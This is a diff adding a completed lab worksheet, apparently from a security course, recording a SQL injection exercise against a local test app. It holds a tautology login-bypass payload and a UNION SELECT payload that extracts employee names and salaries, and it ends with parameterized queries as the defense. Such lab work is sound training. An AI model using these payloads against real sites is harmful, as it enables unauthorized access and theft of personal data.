@@ -1,0 +1,18 @@
+==================================================
+SESSION 25: SQL INJECTION EXFILTRATION REPORT
+==================================================
+
+1. AUTHENTICATION BYPASS
+* Tautology Payload Used: [http://127.0.0.1:8080/auth?user=%27+OR+1%3D1+--&pass=]
+
+2. DATABASE MAPPING (UNION ATTACK)
+* Number of Columns Discovered: [2]
+* Table Name Discovered: [employees]
+
+3. DATA EXFILTRATION
+* CEO Salary Extracted: [2,500,000]
+* Final UNION Payload Used: [http://127.0.0.1:8080/directory?search=%27+UNION+SELECT+name%2C+salary+FROM+employees+--]
+
+4. REMEDIATION
+* What is the primary defense against this attack?
+Answer: [The use of paramaterized queries. These are SQL statements that use placeholders instead of embedding user data directly into the query string. User input is usually what causes a window of opportunity to be created in or on a website.]
